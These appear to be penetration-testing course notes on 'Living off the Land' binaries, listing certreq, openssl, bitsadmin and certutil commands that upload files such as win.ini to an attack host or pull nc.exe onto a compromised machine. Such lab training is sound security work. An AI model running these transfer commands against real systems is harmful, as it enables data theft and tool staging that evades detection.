### **Living off The Land**

The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec) and Matt Graeber (@mattifestation) at DerbyCon 3.

The term **LOLBins** (Living off the Land binaries) originated from a Twitter discussion about naming binaries that attackers can use to perform actions beyond their original purpose. Two primary websites aggregate information on Living off the Land binaries:

- **LOLBAS Project** for Windows Binaries https://lolbas-project.github.io/
    
- **GTFOBins** for Linux Binaries https://gtfobins.github.io/
    

### Common Uses of Living off the Land Binaries

Living off the Land binaries can be used to perform various functions, including:

- Download
    
- Upload
    
- Command Execution
    
- File Read
    
- File Write
    
- Bypasses
    

This guide focuses on using the LOLBAS and GTFOBins projects, providing examples for download and upload functions on Windows and Linux systems.

---

### Using the LOLBAS and GTFOBins Projects

#### LOLBAS (Windows)

To search for download and upload functions in LOLBAS, use the `/download` or `/upload` search options.

**Example: Using CertReq.exe**

1. Listen on a port on the attack host using Netcat.
    
2. Execute `certreq.exe` to upload a file.
    

**Command:**

```
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**Netcat Session Output:**

```
0xs5@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
...
[Mail]
MAPI=1
```

**Note:** If `certreq.exe` throws an error, ensure it supports the `-Post` parameter. Updated versions are available online.

#### GTFOBins (Linux)

To search for download and upload functions in GTFOBins, use `+file download` or `+file upload`.

**Example: Using OpenSSL** OpenSSL is frequently installed and can be used for file transfer similarly to Netcat.

1. Create a certificate and start a server on the attack host:
    

**Commands:**

```
0xs5@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

0xs5@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

2. Download the file from the compromised machine:
    

**Command:**

```
0xs5@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

### Other Common Living off the Land Tools

#### Bitsadmin

The **Background Intelligent Transfer Service (BITS)** can download files from HTTP sites and SMB shares while minimizing impact on user activity.

**File Download with Bitsadmin:**

```
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**PowerShell Integration:**

```
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil

Certutil, a utility included in all Windows versions, can download files. However, **AMSI** often flags its usage as malicious.

**Command:**

```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

---

### Practice and Exploration

- Explore the **LOLBAS** and **GTFOBins** websites.
    
- Experiment with various file transfer methods.
    
- Take detailed notes on obscure techniques; they can save time during assessments.
    

### Detection and Evasion

The final sections will cover:

- Detection considerations for file transfers.
    
- Steps to evade detection during assessments requiring evasive testing.